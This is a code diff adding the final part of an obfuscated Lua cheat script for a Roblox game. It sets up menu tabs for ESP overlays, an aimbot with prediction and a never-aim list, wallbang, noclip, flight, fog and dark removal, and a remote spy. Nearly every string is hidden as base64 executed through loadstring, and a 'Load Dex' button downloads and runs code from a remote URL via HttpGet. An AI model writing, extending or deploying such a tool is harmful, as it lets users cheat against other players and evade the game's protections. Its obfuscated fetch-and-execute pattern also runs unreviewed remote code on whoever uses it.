+        if gun.fireWrap and gun.env.fireBullet == gun.fireWrap then pcall(rawset, gun.env, loadstring(base64decode("ZmlyZUJ1bGxldA=="))(), gun.fireOrig) end
+    end
+    setFreecam(false)
+    pcall(function() RunService:UnbindFromRenderStep(loadstring(base64decode("VG93bkVzcEZyZWVjYW0="))()) end)
+    pcall(function() RunService:UnbindFromRenderStep(loadstring(base64decode("VG93bkVzcEFpbQ=="))()) end)
+    resetNoclip()
+    restoreWallParts(nil)
+    wallHighlight:Destroy()
+    restoreNoDark()
+    restoreNoFog()
+    pcall(function() RunService:UnbindFromRenderStep(loadstring(base64decode("VG93bkVzcE5vRGFyaw=="))()) end)
+    pcall(function() RunService:UnbindFromRenderStep(loadstring(base64decode("VG93bkVzcE5vRm9n"))()) end)
+    for _, connection in ipairs(connections) do connection:Disconnect() end
+    for player in pairs(entries) do unhook(player) end
+    overlay:Destroy()
+    menu:Destroy()
+    env.__TownEspCleanup = nil
+end
+env.__TownEspCleanup = cleanup
+
+local espTab = addTab(loadstring(base64decode("RVNQ"))())
+do
+    local g = espTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("RVNQ"))())
+    g.Toggle(loadstring(base64decode("RW5hYmxlZA=="))(), loadstring(base64decode("ZXNw"))())
+    g.Toggle(loadstring(base64decode("Qm94"))(), loadstring(base64decode("Ym94"))())
+    g.Toggle(loadstring(base64decode("U2tlbGV0b24="))(), loadstring(base64decode("c2tlbGV0b24="))())
+    g.Toggle(loadstring(base64decode("TmFtZXM="))(), loadstring(base64decode("bmFtZXM="))())
+    g.Toggle(loadstring(base64decode("VHJhY2Vycw=="))(), loadstring(base64decode("dHJhY2Vycw=="))())
+    g.Toggle(loadstring(base64decode("SGVhbHRoIEJhcg=="))(), loadstring(base64decode("aGVhbHRo"))())
+    g.Toggle(loadstring(base64decode("VmlzaWJsZSBDb2xvdXI="))(), loadstring(base64decode("dmlzY29sb3I="))())
+    g.Toggle(loadstring(base64decode("U0FGRSAvIFVOU0FGRQ=="))(), loadstring(base64decode("c2FmZQ=="))())
+
+    local w = espTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("V2F0Y2hsaXN0"))())
+    w.Toggle(loadstring(base64decode("SGlnaGxpZ2h0IFdhdGNoZWQ="))(), loadstring(base64decode("d2F0Y2hsaXN0"))())
+    local watchList
+    local watchRows = {}
+    local function refreshWatchUI()
+        for _, row in ipairs(watchRows) do row:Destroy() end
+        watchRows = {}
+        local names = {}
+        for name in pairs(watchlist) do table.insert(names, name) end
+        table.sort(names)
+        for _, name in ipairs(names) do
+            local row = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
+                Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, AutoButtonColor = false, Text = loadstring(base64decode("Wy1dIA=="))() .. name,
+                Font = UI_FONT, TextSize = 14, TextColor3 = Color3.fromRGB(255, 90, 90), TextXAlignment = Enum.TextXAlignment.Left,
+            }, watchList)
+            row.MouseButton1Click:Connect(function()
+                watchlist[name] = nil
+                saveWatchlist()
+                refreshWatchUI()
+            end)
+            watchRows[#watchRows + 1] = row
+        end
+    end
+    w.Input(loadstring(base64decode("dXNlcm5hbWUgKyBFbnRlcg=="))(), function(text)
+        addWatch(text)
+        refreshWatchUI()
+    end)
+    watchList = w.Container()
+    refreshWatchUI()
+end
+
+local aimTab = addTab(loadstring(base64decode("QWltYm90"))())
+do
+    local g = aimTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("QWltYm90"))())
+    g.Toggle(loadstring(base64decode("RW5hYmxlZA=="))(), loadstring(base64decode("YWltYm90"))(), function(on)
+        if not on then
+            aim.running = false
+            cancelLock()
+        end
+    end)
+    g.Toggle(loadstring(base64decode("VG9nZ2xlIE1vZGU="))(), loadstring(base64decode("YWltdG9nZ2xl"))(), function()
+        aim.running = false
+        cancelLock()
+    end)
+    g.Cycle(loadstring(base64decode("TG9jayBQYXJ0"))(), AIM_PARTS, function() return aimPartIndex end, function(JfZaEVmK) aimPartIndex = JfZaEVmK; cancelLock() end)
+    g.Cycle(loadstring(base64decode("TG9jayBNb2Rl"))(), AIM_LOCKS, function() return aimLockIndex end, function(JfZaEVmK) aimLockIndex = JfZaEVmK; cancelLock() end)
+    g.Slider(loadstring(base64decode("Rk9W"))(), 30, 600, function() return aimFov end, function(v) aimFov = v end)
+    g.Slider(loadstring(base64decode("U21vb3RoaW5n"))(), 0, 95, function() return aimSmooth end, function(v) aimSmooth = v end, loadstring(base64decode("JQ=="))())
+    g.Toggle(loadstring(base64decode("U2hvdyBGT1Y="))(), loadstring(base64decode("YWltY2lyY2xl"))())
+    g.Toggle(loadstring(base64decode("UHJlZGljdCBNb3ZlbWVudA=="))(), loadstring(base64decode("YWltb2Zmc2V0"))())
+    g.Slider(loadstring(base64decode("UHJlZGljdGlvbg=="))(), 1, 30, function() return aimOffset end, function(v) aimOffset = v end)
+
+    local tracerGroup = aimTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("VHJhY2Vy"))())
+    tracerGroup.Toggle(loadstring(base64decode("Q2xvc2VzdCBQbGF5ZXIgVHJhY2Vy"))(), loadstring(base64decode("YWltdHJhY2Vy"))())
+    tracerGroup.Cycle(loadstring(base64decode("VHJhY2VyIEZyb20="))(), TRACER_FROMS, function() return tracerFromIndex end, function(JfZaEVmK) tracerFromIndex = JfZaEVmK end)
+
+    local checks = aimTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("Q2hlY2tz"))())
+    checks.Toggle(loadstring(base64decode("V2FsbCBDaGVjaw=="))(), loadstring(base64decode("YWltd2FsbA=="))())
+    checks.Toggle(loadstring(base64decode("U0FGRSBDaGVjaw=="))(), loadstring(base64decode("YWltc2FmZQ=="))())
+    checks.Toggle(loadstring(base64decode("VGVhbSBDaGVjaw=="))(), loadstring(base64decode("YWltdGVhbQ=="))())
+    checks.Toggle(loadstring(base64decode("R3VuIE9ubHk="))(), loadstring(base64decode("YWltZ3Vu"))())
+
+    local never = aimTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("TmV2ZXIgQWltIEF0"))())
+    local neverList
+    local neverRows = {}
+    local function refreshNeverUI()
+        for _, row in ipairs(neverRows) do row:Destroy() end
+        neverRows = {}
+        local names = {}
+        for name in pairs(aimBlacklist) do table.insert(names, name) end
+        table.sort(names)
+        for _, name in ipairs(names) do
+            local row = make(loadstring(base64decode("VGV4dEJ1dHRvbg=="))(), {
+                Size = UDim2.new(1, 0, 0, 16), BackgroundTransparency = 1, AutoButtonColor = false, Text = loadstring(base64decode("Wy1dIA=="))() .. name,
+                Font = UI_FONT, TextSize = 14, TextColor3 = Color3.fromRGB(255, 200, 90), TextXAlignment = Enum.TextXAlignment.Left,
+            }, neverList)
+            row.MouseButton1Click:Connect(function()
+                aimBlacklist[name] = nil
+                saveAimBlacklist()
+                refreshNeverUI()
+            end)
+            neverRows[#neverRows + 1] = row
+        end
+    end
+    never.Label(loadstring(base64decode("TGlzdGVkIHBsYXllcnMgYXJlIHNraXBwZWQgYnkgdGhlIGFpbWJvdCBhbmQgdHJhY2VyLiBDbGljayBhIHJvdyB0byByZW1vdmUgaXQu"))())
+    never.Input(loadstring(base64decode("dXNlcm5hbWUgKyBFbnRlcg=="))(), function(text)
+        addAimBlacklist(text)
+        cancelLock()
+        refreshNeverUI()
+    end)
+    neverList = never.Container()
+    refreshNeverUI()
+
+    local status = aimTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("U3RhdHVz"))())
+    aimDebugLabel = status.Label(loadstring(base64decode(""))())
+end
+
+local loadoutTab = addTab(loadstring(base64decode("TG9hZG91dA=="))())
+do
+    local g = loadoutTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("TG9hZG91dA=="))())
+    g.Label(loadstring(base64decode("T25lIGNoYXQgY29tbWFuZCBwZXIgbGluZSwgc2VudCBpbiBvcmRlci4="))())
+    g.TextArea(loadstring(base64decode("IXNwYXduIC4uLlxuIXNwYXduYXJtb3IgLi4uXG4hc3Bhd25tYWdzIC4uLg=="))(), loadout.text,
+        function(text) loadout.text = text end,
+        function() loadout.save() end)
+    g.Button(loadstring(base64decode("UnVuIExvYWRvdXQ="))(), function() loadout.run() end)
+    g.Button(loadstring(base64decode("U3RvcA=="))(), function()
+        loadout.stop()
+        notify(loadstring(base64decode("TG9hZG91dCBzdG9wcGVk"))())
+    end)
+    g.Toggle(loadstring(base64decode("UnVuIE9uIFJlc3Bhd24="))(), loadstring(base64decode("bG9hZG91dHNwYXdu"))())
+    g.Slider(loadstring(base64decode("RGVsYXkgQmV0d2VlbiBDb21tYW5kcw=="))(), 250, 10000, function() return loadout.delayMs end,
+        function(v) loadout.delayMs = v end, loadstring(base64decode("bXM="))())
+
+    local info = loadoutTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("Q29tbWFuZHMgSW4gVGhpcyBQbGFjZQ=="))())
+    info.Label(loadstring(base64decode("RnJvbSB0aGUgZ2FtZSdzIGNoYXQgY29tbWFuZHMgKGFsaWFzIGluIGJyYWNrZXRzKTpcbg=="))()
+        .. loadstring(base64decode("IXNwYXduIFshc11cbiFzcGF3bmFybW9yIFshc2FdXG4hc3Bhd25tYWdzIFshc21dXG4hc3Bhd250b29scyBbIXN0XVxu"))()
+        .. loadstring(base64decode("IXNldGFybW9yIFshc3RhXVxuIXJlZmlsbCBbIXJmXVxuIWhlYWwgWyFoXVxuIW1zcGF3biBbIW1zXVxuIWRzcGF3biBbIWRzXVxu"))()
+        .. loadstring(base64decode("VHlwZSAhY21kcyBpbiBnYW1lIGZvciB0aGUgZnVsbCBsaXN0IGFuZCB3aGF0IGVhY2ggb25lIHRha2VzLiA="))()
+        .. loadstring(base64decode("UHV0IHRoZSBleGFjdCB0ZXh0IHlvdSdkIG5vcm1hbGx5IHR5cGUgb24gZWFjaCBsaW5lLg=="))())
+end
+
+local wallTab = addTab(loadstring(base64decode("V2FsbGJhbmc="))())
+do
+    local g = wallTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("V2FsbGJhbmc="))())
+    g.Toggle(loadstring(base64decode("RW5hYmxlZA=="))(), loadstring(base64decode("d2FsbGJhbmc="))())
+    g.Cycle(loadstring(base64decode("TWV0aG9k"))(), WALL_METHODS, function() return wallMethodIndex end, function(JfZaEVmK) wallMethodIndex = JfZaEVmK end)
+    wallDebugLabel = g.Label(loadstring(base64decode(""))())
+end
+
+local worldTab = addTab(loadstring(base64decode("V29ybGQ="))())
+do
+    local light = worldTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("TGlnaHRpbmc="))())
+    light.Toggle(loadstring(base64decode("QWx3YXlzIERheQ=="))(), loadstring(base64decode("ZGF5"))(), function(on)
+        if on then
+            savedClock = Lighting.ClockTime
+        elseif savedClock then
+            Lighting.ClockTime = savedClock
+            savedClock = nil
+        end
+    end)
+    light.Toggle(loadstring(base64decode("Tm8gRGFyaw=="))(), loadstring(base64decode("bm9kYXJr"))(), function(on)
+        if on then
+            noDarkSaved = {
+                ambient = Lighting.Ambient,
+                outdoor = Lighting.OutdoorAmbient,
+                exposure = Lighting.ExposureCompensation,
+            }
+            applyNoDark()
+        else
+            restoreNoDark()
+        end
+    end)
+    light.Toggle(loadstring(base64decode("Tm8gRm9n"))(), loadstring(base64decode("bm9mb2c="))(), function(on)
+        if on then
+            noFogSaved = { fogStart = Lighting.FogStart, fogEnd = Lighting.FogEnd }
+            atmosphereSaved = {}
+            for atmosphere in pairs(atmospheres) do saveAtmosphere(atmosphere) end
+            applyNoFog()
+        else
+            restoreNoFog()
+        end
+    end)
+    local levelNames = {}
+    for JfZaEVmK, level in ipairs(NODARK_LEVELS) do levelNames[JfZaEVmK] = level.name end
+    light.Cycle(loadstring(base64decode("Tm8gRGFyayBMZXZlbA=="))(), levelNames, function() return noDarkLevel end, function(JfZaEVmK)
+        noDarkLevel = JfZaEVmK
+        applyNoDark()
+    end)
+
+    local feed = worldTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("S2lsbCBGZWVk"))())
+    feed.Toggle(loadstring(base64decode("S2lsbCBGZWVk"))(), loadstring(base64decode("a2lsbGxvZw=="))(), function(on)
+        if not on then killLog.clear() end
+    end)
+
+    local cam = worldTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("Q2FtZXJh"))())
+    refreshFreecam = cam.Toggle(loadstring(base64decode("RnJlZWNhbQ=="))(), loadstring(base64decode("ZnJlZWNhbQ=="))(), function(on) setFreecam(on) end)
+
+    local walls = worldTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("V2FsbHM="))())
+    walls.Toggle(loadstring(base64decode("V2FsbCBDbGljaw=="))(), loadstring(base64decode("d2FsbGNsaWNr"))(), function(on)
+        if on and type(fireclickdetector) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then
+            options.wallclick = false
+            notify(loadstring(base64decode("ZmlyZWNsaWNrZGV0ZWN0b3IgaXMgbWlzc2luZw=="))())
+        end
+    end)
+    walls.Toggle(loadstring(base64decode("V2FsbCBOb2NsaXA="))(), loadstring(base64decode("bm9jbGlw"))())
+    walls.Button(loadstring(base64decode("UmVzZXQgV2FsbHM="))(), resetNoclip)
+end
+
+local miscTab = addTab(loadstring(base64decode("TWlzYw=="))())
+do
+    local tools = miscTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("VG9vbHM="))())
+    tools.Toggle(loadstring(base64decode("UmVtb3RlIFNweQ=="))(), loadstring(base64decode("c3B5"))())
+    local spyLabel = tools.Label(loadstring(base64decode("TG9nZ2VkOiAw"))())
+    spyRefresh = function() spyLabel.Text = loadstring(base64decode("TG9nZ2VkOiA="))() .. spyCount end
+    tools.Button(loadstring(base64decode("RHVtcCBHdW4="))(), function()
+        local ok, info = dumpGun()
+        notify(ok and (loadstring(base64decode("RHVtcGVkIA=="))() .. info) or info)
+    end)
+
+    local dexLoaded, dexBusy = false, false
+    tools.Button(loadstring(base64decode("TG9hZCBEZXg="))(), function()
+        if dexLoaded or dexBusy then return end
+        if type(loadstring) ~= loadstring(base64decode("ZnVuY3Rpb24="))() then notify(loadstring(base64decode("bG9hZHN0cmluZyBpcyBtaXNzaW5n"))()) return end
+        dexBusy = true
+        notify(loadstring(base64decode("TG9hZGluZyBEZXguLi4="))())
+        task.spawn(function()
+            local ok, err = pcall(function()
+                loadstring(game:HttpGet(DEX_URL))()
+            end)
+            dexBusy = false
+            if ok then
+                dexLoaded = true
+                notify(loadstring(base64decode("RGV4IGxvYWRlZA=="))())
+            else
+                warn(loadstring(base64decode("W2xhcnB3YXJlXSBEZXggZmFpbGVkIHRvIGxvYWQ6IA=="))() .. tostring(err))
+                notify(loadstring(base64decode("RGV4IGZhaWxlZCB0byBsb2Fk"))())
+            end
+        end)
+    end)
+
+    local flight = miscTab.group(loadstring(base64decode("bGVmdA=="))(), loadstring(base64decode("RmxpZ2h0"))())
+    refreshFly = flight.Toggle(loadstring(base64decode("RmxpZ2h0"))(), loadstring(base64decode("Zmx5"))(), setFly)
+    flight.Keybind(loadstring(base64decode("VG9nZ2xlIEtleQ=="))(), function() return fly.key end, function(key) fly.key = key end)
+    flight.Slider(loadstring(base64decode("U3BlZWQ="))(), 10, 250, function() return fly.speed end, function(v) fly.speed = v end)
+    flight.Label(loadstring(base64decode("V0FTRCBtb3ZlcyBhbG9uZyB0aGUgY2FtZXJhLCBTcGFjZSB1cCwgTGVmdEN0cmwgZG93bi4="))())
+
+    local exec = miscTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("RXhlY3V0b3I="))())
+    local capLabel = exec.Label(loadstring(base64decode(""))())
+    exec.Button(loadstring(base64decode("Q2hlY2sgRXhlY3V0b3I="))(), function() capLabel.Text = capabilityText() end)
+
+    local menuGroup = miscTab.group(loadstring(base64decode("cmlnaHQ="))(), loadstring(base64decode("TWVudQ=="))())
+    menuGroup.Button(loadstring(base64decode("VW5sb2Fk"))(), cleanup)
+end
+
+selectTab(tabs[1])
+
+local dragging, dragStart, startPos
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging, dragStart, startPos = true, input.Position, window.Position
+    end
+end)
+table.insert(connections, UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end))
+table.insert(connections, UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end))
+
+table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    if input.KeyCode == MENU_KEY then window.Visible = not window.Visible end
+end))
+end
+k7wscasF(45luG)
+end)(...)
